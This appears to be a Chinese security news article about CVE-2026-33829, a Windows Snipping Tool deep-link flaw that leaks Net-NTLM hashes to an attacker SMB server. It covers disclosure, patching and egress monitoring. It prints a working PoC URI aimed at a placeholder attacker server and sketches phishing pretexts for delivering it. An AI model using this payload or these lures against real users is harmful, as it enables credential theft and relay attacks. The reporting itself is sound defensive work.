#  Windows截图工具NTLM哈希泄露漏洞PoC利用代码发布  
 网安百色   2026-04-21 10:52  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WibvcdjxgJnus8qQVwyX6tDY5oJSCQm82syqCb9hQerNmCib7bOibhHhAL3kVuzBmmu3ia1HskNXEhGHJSmbZf32IKFz7aU2AVHibribQPJibLY5MU/640?wx_fmt=png&from=appmsg "")  
  
针对Microsoft Snipping Tool中新披露漏洞的概念验证（PoC）利用代码已被公开发布，该漏洞允许攻击者通过诱使用户访问恶意网页来静默窃取用户的Net-NTLM凭证哈希。  
  
该漏洞被追踪为CVE-2026-33829，存在于Windows Snipping Tool如何处理使用ms-screensketch协议架构的深度链接URI注册。受影响版本的应用程序注册了此深度链接，该链接接受filePath参数。  
  
由于缺乏适当的输入验证，攻击者可以提供指向远程攻击者控制的SMB服务器的UNC路径，强制进行经过身份验证的SMB连接，并在此过程中捕获受害者的Net-NTLM哈希。  
  
该漏洞由Black Arrow的安全研究人员发现并报告，他们在公开之前与Microsoft协调了披露事宜。  
  
**Windows Snipping Tool PoC**  
  
利用此漏洞所需的技术复杂度极低。攻击者只需托管一个恶意URL——或一个自动触发深度链接的HTML页面——并说服目标访问它即可。Black Arrow Security的PoC通过单个浏览器触发的URI演示了该攻击：  
```
ms-screensketch:edit?&filePath=\\<attacker-smb-server>\file.png&isTemporary=false&saved=true&source=Toast
```  
  
当受害者打开此链接时，Snipping Tool会启动并静默尝试通过SMB加载远程资源。在此连接尝试期间，Windows会自动将用户的Net-NTLM身份验证响应传输到攻击者的服务器，暴露的凭证随后可以被离线破解或用于针对内部网络资源的NTLM中继攻击。  
  
**社会工程学风险**  
  
CVE-2026-33829特别危险之处在于它如何自然地适用于社会工程学活动。由于Snipping Tool在利用过程中实际会打开，该攻击在视觉上与可信的借口保持一致，例如要求员工裁剪公司壁纸、编辑徽章照片或审查HR文档。  
  
攻击者可以注册一个类似snip.example.com的域名，并提供一个令人信服的图像URL，该URL在后台静默传递恶意深度链接有效载荷。  
  
受害者看不到任何异常；Snipping Tool按预期打开，而NTLM身份验证在后台透明地进行。  
  
这种攻击向量在企业环境中特别有效，因为钓鱼邮件引用内部HR门户、IT服务台或共享文档系统的情况很常见。  
  
**补丁可用性与时间线**  
  
Microsoft在其2026年4月14日的Patch Tuesday安全更新中解决了该漏洞。披露时间线如下：  
- 2026年3月23日 — 漏洞报告给Microsoft  
- 2026年4月14日 — Microsoft发布安全补丁  
- 2026年4月14日 — 协调的公开公告和PoC发布  
运行受影响版本Windows Snipping Tool的组织和个人用户应立即应用2026年4月14日的安全更新。  
  
应监控内部网络是否存在到外部或未知主机的意外出站SMB连接（端口445），这可能表明存在主动利用尝试。无论补丁状态如何，在网络边界阻止出站SMB流量仍然是强有力的防御措施。  
  
本公众号所载文章为本公众号原创或根据网络搜索下载编辑整理，文章版权归原作者所有，仅供读者学习、参考，禁止用于商业用途。因转载众多，无法找到真正来源，如标错来源，或对于文中所使用的图片、文字、链接中所包含的软件/资料等，如有侵权，请跟我们联系删除，谢谢！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/1QIbxKfhZo5lNbibXUkeIxDGJmD2Md5vKicbNtIkdNvibicL87FjAOqGicuxcgBuRjjolLcGDOnfhMdykXibWuH6DV1g/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=p6hk1x4r&tp=webp#imgIndex=1 "")  
  
